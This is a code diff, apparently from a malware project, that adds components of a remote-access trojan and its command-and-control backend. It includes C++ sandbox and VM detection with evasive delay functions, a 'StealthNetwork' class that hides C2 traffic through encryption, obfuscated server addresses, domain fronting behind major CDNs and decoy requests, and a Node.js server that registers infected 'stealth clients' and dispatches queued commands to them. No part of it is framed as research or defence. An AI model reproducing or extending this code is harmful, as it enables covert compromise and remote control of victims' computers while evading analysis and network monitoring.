+        GetCursorPos(&pt1);
+        Sleep(1000);
+        GetCursorPos(&pt2);
+        
+        return (pt1.x == pt2.x && pt1.y == pt2.y);
+    }
+    
+    bool checkSystemUptime() {
+        return GetTickCount() < 600000; // Less than 10 minutes
+    }
+    
+    bool checkFileSystemActivity() {
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = FindFirstFileA("C:\\Users\\*\\Recent\\*", &findData);
+        if (hFind == INVALID_HANDLE_VALUE) return true;
+        
+        int fileCount = 0;
+        do {
+            fileCount++;
+        } while (FindNextFileA(hFind, &findData) && fileCount < 10);
+        
+        FindClose(hFind);
+        return fileCount < 5;
+    }
+    
+    bool checkNetworkConnectivity() {
+        return !InternetCheckConnectionA("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
+    }
+    
+    bool checkProcessCount() {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        int processCount = 0;
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        
+        if (Process32First(hSnapshot, &pe32)) {
+            do {
+                processCount++;
+            } while (Process32Next(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return processCount < 30;
+    }
+    
+    bool checkMemorySize() {
+        MEMORYSTATUSEX memStatus;
+        memStatus.dwLength = sizeof(memStatus);
+        GlobalMemoryStatusEx(&memStatus);
+        
+        return memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024);
+    }
+    
+    bool checkCPUCores() {
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        return sysInfo.dwNumberOfProcessors < 2;
+    }
+    
+    bool checkRecentFiles() {
+        char recentPath[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, SHGFP_TYPE_CURRENT, recentPath) != S_OK) {
+            return true;
+        }
+        
+        WIN32_FIND_DATAA findData;
+        strcat_s(recentPath, "\\*");
+        HANDLE hFind = FindFirstFileA(recentPath, &findData);
+        
+        if (hFind == INVALID_HANDLE_VALUE) return true;
+        
+        int fileCount = 0;
+        do {
+            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                fileCount++;
+            }
+        } while (FindNextFileA(hFind, &findData) && fileCount < 5);
+        
+        FindClose(hFind);
+        return fileCount < 3;
+    }
+    
+    void useWaitableTimer(DWORD milliseconds) {
+        HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
+        if (hTimer) {
+            LARGE_INTEGER liDueTime;
+            liDueTime.QuadPart = -10000LL * milliseconds;
+            SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);
+            WaitForSingleObject(hTimer, INFINITE);
+            CloseHandle(hTimer);
+        }
+    }
+    
+    void useNtDelayExecution(DWORD milliseconds) {
+        typedef NTSTATUS(WINAPI* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
+        
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (hNtdll) {
+            pNtDelayExecution NtDelayExecution = 
+                (pNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
+            
+            if (NtDelayExecution) {
+                LARGE_INTEGER delay;
+                delay.QuadPart = -10000LL * milliseconds;
+                NtDelayExecution(FALSE, &delay);
+            }
+        }
+    }
+    
+    void useTimerQueue(DWORD milliseconds) {
+        HANDLE hTimerQueue = CreateTimerQueue();
+        if (hTimerQueue) {
+            HANDLE hTimer;
+            HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+            
+            CreateTimerQueueTimer(&hTimer, hTimerQueue, 
+                [](PVOID lpParam, BOOLEAN) { SetEvent((HANDLE)lpParam); },
+                hEvent, milliseconds, 0, 0);
+            
+            WaitForSingleObject(hEvent, INFINITE);
+            DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
+            DeleteTimerQueue(hTimerQueue);
+            CloseHandle(hEvent);
+        }
+    }
+    
+    void useBusyWait(DWORD milliseconds) {
+        LARGE_INTEGER freq, start, current;
+        QueryPerformanceFrequency(&freq);
+        QueryPerformanceCounter(&start);
+        
+        LONGLONG targetTicks = freq.QuadPart * milliseconds / 1000;
+        
+        do {
+            SwitchToThread(); // Yield to other threads
+            QueryPerformanceCounter(&current);
+        } while ((current.QuadPart - start.QuadPart) < targetTicks);
+    }
+};
+#pragma once
+#include <windows.h>
+#include <wininet.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string>
+#include <vector>
+#include <random>
+#include <chrono>
+#include <map>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "ws2_32.lib")
+
+// XOR encryption for simple obfuscation
+class SimpleXOR {
+private:
+    std::vector<BYTE> key;
+    
+public:
+    SimpleXOR(const std::string& keyStr) {
+        key.assign(keyStr.begin(), keyStr.end());
+    }
+    
+    std::vector<BYTE> encrypt(const std::vector<BYTE>& data) {
+        std::vector<BYTE> result = data;
+        for (size_t i = 0; i < result.size(); i++) {
+            result[i] ^= key[i % key.size()];
+        }
+        return result;
+    }
+    
+    std::vector<BYTE> decrypt(const std::vector<BYTE>& data) {
+        return encrypt(data); // XOR is symmetric
+    }
+};
+
+// RC4 encryption for stronger obfuscation
+class RC4 {
+private:
+    std::vector<BYTE> S;
+    int i, j;
+    
+public:
+    RC4(const std::vector<BYTE>& key) {
+        init(key);
+    }
+    
+    void init(const std::vector<BYTE>& key) {
+        S.resize(256);
+        for (int i = 0; i < 256; i++) {
+            S[i] = i;
+        }
+        
+        int j = 0;
+        for (int i = 0; i < 256; i++) {
+            j = (j + S[i] + key[i % key.size()]) % 256;
+            std::swap(S[i], S[j]);
+        }
+        
+        i = j = 0;
+    }
+    
+    std::vector<BYTE> encrypt(const std::vector<BYTE>& data) {
+        std::vector<BYTE> result;
+        result.reserve(data.size());
+        
+        for (BYTE byte : data) {
+            i = (i + 1) % 256;
+            j = (j + S[i]) % 256;
+            std::swap(S[i], S[j]);
+            
+            BYTE keyByte = S[(S[i] + S[j]) % 256];
+            result.push_back(byte ^ keyByte);
+        }
+        
+        return result;
+    }
+    
+    std::vector<BYTE> decrypt(const std::vector<BYTE>& data) {
+        return encrypt(data); // RC4 is symmetric
+    }
+};
+
+// Base64 encoding for data obfuscation
+class Base64 {
+private:
+    static const std::string chars;
+    
+public:
+    static std::string encode(const std::vector<BYTE>& data) {
+        std::string result;
+        int val = 0, valb = -6;
+        
+        for (BYTE c : data) {
+            val = (val << 8) + c;
+            valb += 8;
+            while (valb >= 0) {
+                result.push_back(chars[(val >> valb) & 0x3F]);
+                valb -= 6;
+            }
+        }
+        
+        if (valb > -6) {
+            result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
+        }
+        
+        while (result.size() % 4) {
+            result.push_back('=');
+        }
+        
+        return result;
+    }
+    
+    static std::vector<BYTE> decode(const std::string& encoded) {
+        std::vector<BYTE> result;
+        int val = 0, valb = -8;
+        
+        for (char c : encoded) {
+            if (c == '=') break;
+            
+            size_t pos = chars.find(c);
+            if (pos == std::string::npos) continue;
+            
+            val = (val << 6) + pos;
+            valb += 6;
+            if (valb >= 0) {
+                result.push_back((val >> valb) & 0xFF);
+                valb -= 8;
+            }
+        }
+        
+        return result;
+    }
+};
+
+const std::string Base64::chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+// Network stealth communication class
+class StealthNetwork {
+private:
+    std::vector<std::string> c2Servers;
+    std::vector<std::string> domainFronts;
+    std::vector<std::string> userAgents;
+    std::string encryptionKey;
+    RC4 cipher;
+    std::mt19937 rng;
+    
+public:
+    StealthNetwork() : cipher(std::vector<BYTE>{'k','e','y'}), rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
+        initializeDefaults();
+    }
+    
+    void initializeDefaults() {
+        // Obfuscated C2 servers (decode at runtime)
+        c2Servers = {
+            decryptString("encrypted_c2_1"),
+            decryptString("encrypted_c2_2"),
+            decryptString("encrypted_c2_3")
+        };
+        
+        // Domain fronting targets (legitimate domains)
+        domainFronts = {
+            "ajax.googleapis.com",
+            "cdn.jsdelivr.net",
+            "cdnjs.cloudflare.com",
+            "fonts.googleapis.com",
+            "api.github.com"
+        };
+        
+        // Realistic user agents
+        userAgents = {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        };
+        
+        encryptionKey = generateRandomKey(32);
+        cipher.init(std::vector<BYTE>(encryptionKey.begin(), encryptionKey.end()));
+    }
+    
+    // HTTP request with stealth features
+    std::string makeStealthRequest(const std::string& endpoint, const std::string& data = "", const std::string& method = "GET") {
+        std::string result;
+        
+        // Try each C2 server with domain fronting
+        for (const auto& server : c2Servers) {
+            for (const auto& front : domainFronts) {
+                if (makeRequestWithFronting(server, front, endpoint, data, method, result)) {
+                    return result;
+                }
+                
+                // Random delay between attempts
+                Sleep(getRandomDelay(1000, 5000));
+            }
+        }
+        
+        return "";
+    }
+    
+    // Make HTTP request with domain fronting
+    bool makeRequestWithFronting(const std::string& realServer, const std::string& frontDomain,
+                                const std::string& endpoint, const std::string& data,
+                                const std::string& method, std::string& response) {
+        
+        HINTERNET hInternet = InternetOpenA(getRandomUserAgent().c_str(), 
+                                           INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hInternet) return false;
+        
+        // Connect to front domain
+        HINTERNET hConnect = InternetConnectA(hInternet, frontDomain.c_str(), 
+                                             INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, 
+                                             INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        // Prepare request with custom headers
+        std::string requestPath = endpoint;
+        DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
+        
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), requestPath.c_str(),
+                                             NULL, NULL, NULL, flags, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        // Add stealth headers
+        std::string headers = buildStealthHeaders(realServer);
+        HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
+        
+        // Encrypt and encode data if present
+        std::string processedData = data;
+        if (!data.empty()) {
+            std::vector<BYTE> dataBytes(data.begin(), data.end());
+            std::vector<BYTE> encrypted = cipher.encrypt(dataBytes);
+            processedData = Base64::encode(encrypted);
+        }
+        
+        // Send request
+        BOOL result = HttpSendRequestA(hRequest, NULL, 0, 
+                                      (LPVOID)processedData.c_str(), processedData.length());
+        
+        if (result) {
+            // Read response
+            char buffer[4096];
+            DWORD bytesRead;
+            std::string rawResponse;
+            
+            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+                rawResponse.append(buffer, bytesRead);
+            }
+            
+            // Decrypt response if it's encrypted
+            if (!rawResponse.empty()) {
+                try {
+                    std::vector<BYTE> decoded = Base64::decode(rawResponse);
+                    std::vector<BYTE> decrypted = cipher.decrypt(decoded);
+                    response.assign(decrypted.begin(), decrypted.end());
+                } catch (...) {
+                    response = rawResponse; // Fallback to raw response
+                }
+            }
+        }
+        
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        
+        return result;
+    }
+    
+    // Build stealth HTTP headers
+    std::string buildStealthHeaders(const std::string& realServer) {
+        std::string headers;
+        
+        // Host header for domain fronting
+        headers += "Host: " + realServer + "\r\n";
+        
+        // Random legitimate headers
+        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
+        headers += "Accept-Language: en-US,en;q=0.5\r\n";
+        headers += "Accept-Encoding: gzip, deflate\r\n";
+        headers += "DNT: 1\r\n";
+        headers += "Connection: keep-alive\r\n";
+        headers += "Upgrade-Insecure-Requests: 1\r\n";
+        
+        // Random session cookies to look legitimate
+        headers += "Cookie: sessionid=" + generateRandomString(32) + "; csrftoken=" + generateRandomString(16) + "\r\n";
+        
+        // Custom header for C2 identification (obfuscated)
+        headers += "X-Requested-With: XMLHttpRequest\r\n";
+        headers += "X-Forwarded-For: " + generateRandomIP() + "\r\n";
+        
+        return headers;
+    }
+    
+    // WebSocket connection with stealth features
+    bool establishWebSocketConnection(const std::string& server, int port) {
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            return false;
+        }
+        
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) {
+            WSACleanup();
+            return false;
+        }
+        
+        // Resolve server address
+        struct addrinfo hints, *result;
+        ZeroMemory(&hints, sizeof(hints));
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+        
+        if (getaddrinfo(server.c_str(), std::to_string(port).c_str(), &hints, &result) != 0) {
+            closesocket(sock);
+            WSACleanup();
+            return false;
+        }
+        
+        // Connect with timeout
+        if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
+            freeaddrinfo(result);
+            closesocket(sock);
+            WSACleanup();
+            return false;
+        }
+        
+        freeaddrinfo(result);
+        
+        // Perform WebSocket handshake with obfuscated headers
+        std::string handshake = buildWebSocketHandshake(server);
+        if (send(sock, handshake.c_str(), handshake.length(), 0) == SOCKET_ERROR) {
+            closesocket(sock);
+            WSACleanup();
+            return false;
+        }
+        
+        // Read handshake response
+        char buffer[1024];
+        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesReceived <= 0) {
+            closesocket(sock);
+            WSACleanup();
+            return false;
+        }
+        
+        buffer[bytesReceived] = '\0';
+        
+        // Verify handshake response
+        if (strstr(buffer, "101 Switching Protocols") == nullptr) {
+            closesocket(sock);
+            WSACleanup();
+            return false;
+        }
+        
+        // Store socket for future communication
+        // Implementation would continue with message handling
+        
+        closesocket(sock);
+        WSACleanup();
+        return true;
+    }
+    
+    // Build WebSocket handshake with stealth features
+    std::string buildWebSocketHandshake(const std::string& server) {
+        std::string key = Base64::encode(std::vector<BYTE>(16, 0x42)); // Dummy key
+        
+        std::string handshake = "GET /ws HTTP/1.1\r\n";
+        handshake += "Host: " + server + "\r\n";
+        handshake += "Upgrade: websocket\r\n";
+        handshake += "Connection: Upgrade\r\n";
+        handshake += "Sec-WebSocket-Key: " + key + "\r\n";
+        handshake += "Sec-WebSocket-Version: 13\r\n";
+        handshake += "User-Agent: " + getRandomUserAgent() + "\r\n";
+        handshake += "Origin: https://" + server + "\r\n";
+        handshake += "\r\n";
+        
+        return handshake;
+    }
+    
+    // Traffic timing obfuscation
+    void performTrafficObfuscation() {
+        // Generate random legitimate-looking traffic
+        std::vector<std::string> legitimateEndpoints = {
+            "/api/v1/status",
+            "/health",
+            "/ping",
+            "/favicon.ico",
+            "/robots.txt"
+        };
+        
+        for (int i = 0; i < getRandomInt(3, 8); i++) {
+            std::string endpoint = legitimateEndpoints[getRandomInt(0, legitimateEndpoints.size() - 1)];
+            makeStealthRequest(endpoint);
+            Sleep(getRandomDelay(500, 3000));
+        }
+    }
+    
+    // DNS over HTTPS for stealth resolution
+    std::string resolveDoH(const std::string& domain) {
+        std::string dohServer = "https://1.1.1.1/dns-query";
+        std::string query = "?name=" + domain + "&type=A";
+        
+        return makeStealthRequest(query);
+    }
+    
+private:
+    std::string decryptString(const std::string& encrypted) {
+        // Placeholder for string decryption
+        // In practice, implement proper decryption
+        return "localhost:3000"; // Backend server address (port 3000 based on backend config)
+    }
+    
+    std::string generateRandomKey(int length) {
+        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        std::string result;
+        
+        for (int i = 0; i < length; i++) {
+            result += chars[rng() % chars.length()];
+        }
+        
+        return result;
+    }
+    
+    std::string generateRandomString(int length) {
+        return generateRandomKey(length);
+    }
+    
+    std::string generateRandomIP() {
+        return std::to_string(rng() % 256) + "." + 
+               std::to_string(rng() % 256) + "." + 
+               std::to_string(rng() % 256) + "." + 
+               std::to_string(rng() % 256);
+    }
+    
+    std::string getRandomUserAgent() {
+        return userAgents[rng() % userAgents.size()];
+    }
+    
+    int getRandomInt(int min, int max) {
+        return min + (rng() % (max - min + 1));
+    }
+    
+    DWORD getRandomDelay(DWORD min, DWORD max) {
+        return min + (rng() % (max - min + 1));
+    }
+};
+const mongoose = require('mongoose');
+const Client = require('../models/Client');
+const Task = require('../models/Task');
+
+// Store all connected web clients for broadcasting
+const webClients = new Set();
+const stealthClients = new Map(); // Map of uuid -> websocket
+
+// Broadcast function to send data to all web clients
+function broadcastToWebClients(data) {
+    const message = JSON.stringify(data);
+    webClients.forEach(client => {
+        if (client.readyState === client.OPEN) {
+            client.send(message);
+        } else {
+            webClients.delete(client);
+        }
+    });
+}
+
+module.exports = function connectionHandler(ws) {
+    // Log when a new client connects to help with debugging
+    console.log('A new client connected via WebSocket.');
+
+    ws.on('message', async (message) => {
+        try {
+            // The incoming message is a Buffer, so it must be converted to a string
+            // before it can be parsed as JSON. This was the source of the error.
+            const messageString = message.toString();
+            const data = JSON.parse(messageString);
+
+            // Handle web client identification
+            if (data.type === 'web_client') {
+                ws.clientType = 'web';
+                webClients.add(ws);
+                console.log('Web client connected. Total web clients:', webClients.size);
+                
+                // Send current client list to new web client
+                const clients = await Client.find({});
+                ws.send(JSON.stringify({
+                    type: 'client_list_update',
+                    clients: clients
+                }));
+                return;
+            }
+
+            if (data.type === 'output') {
+                // This is an output message from a stealth client
+                const { taskId, output } = data;
+                await Task.findByIdAndUpdate(taskId, { output: output });
+                
+                // Broadcast task completion to web clients
+                broadcastToWebClients({
+                    type: 'task_completed',
+                    taskId: taskId,
+                    output: output
+                });
+                return;
+            }
+
+            // Handle stealth client messages
+            if (data.uuid) {
+                ws.uuid = data.uuid;
+                ws.clientType = 'stealth';
+                stealthClients.set(data.uuid, ws);
+            } else {
+                return; // Ignore messages without a UUID
+            }
+            
+            console.log(`Received data from stealth client ${data.uuid}`);
+
+            // Find the client by UUID and update its details, or create it if it doesn't exist.
+            let updatedClient = await Client.findOne({ uuid: data.uuid });
+            
+            if (updatedClient) {
+                // Update existing client
+                updatedClient.ip = data.ip || data.ipAddress || 'Unknown';
+                updatedClient.ipAddress = data.ipAddress || data.ip || 'Unknown';
+                updatedClient.computerName = data.computerName || data.hostname || 'Unknown';
+                updatedClient.hostname = data.hostname || 'Unknown';
+                updatedClient.platform = data.platform || 'Unknown';
+                updatedClient.country = data.country || 'Unknown';
+                updatedClient.lastSeen = new Date();
+                updatedClient.lastActiveTime = new Date();
+                updatedClient.status = 'online';
+                await updatedClient.save();
+            } else {
+                // Create new client
+                updatedClient = new Client({
+                    uuid: data.uuid,
+                    ip: data.ip || data.ipAddress || 'Unknown',
+                    ipAddress: data.ipAddress || data.ip || 'Unknown',
+                    computerName: data.computerName || data.hostname || 'Unknown',
+                    hostname: data.hostname || 'Unknown',
+                    platform: data.platform || 'Unknown',
+                    country: data.country || 'Unknown',
+                    lastSeen: new Date(),
+                    lastActiveTime: new Date(),
+                    status: 'online'
+                });
+                await updatedClient.save();
+            }
+
+            // Broadcast client status update to all web clients
+            broadcastToWebClients({
+                type: 'client_status_update',
+                client: updatedClient
+            });
+
+            // Check for any pending tasks for this client
+            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
+            for (const task of tasks) {
+                ws.send(JSON.stringify({ cmd: task.command, taskId: task._id }));
+                task.status = 'executed';
+                await task.save();
+                
+                // Broadcast task execution to web clients
+                broadcastToWebClients({
+                    type: 'task_executed',
+                    taskId: task._id,
+                    clientUuid: data.uuid,
+                    command: task.command
+                });
+            }
+
+        } catch (err) {
+            console.error('WebSocket message processing error:', err);
+        }
+    });
+
+    ws.on('close', async () => {
+        console.log('Client disconnected');
+        
+        if (ws.clientType === 'web') {
+            webClients.delete(ws);
+            console.log('Web client disconnected. Total web clients:', webClients.size);
+        } else if (ws.uuid && ws.clientType === 'stealth') {
+            stealthClients.delete(ws.uuid);
+            
+            const updatedClient = await Client.findOneAndUpdate(
+                { uuid: ws.uuid },
+                { $set: { status: 'offline' } },
+                { new: true }
+            );
+            
+            // Broadcast client disconnection to all web clients
+            if (updatedClient) {
+                broadcastToWebClients({
+                    type: 'client_status_update',
+                    client: updatedClient
+                });
+            }
+        }
+    });
+
+    ws.on('error', (error) => {
+        console.error('WebSocket error on connection:', error);
+    });
+};
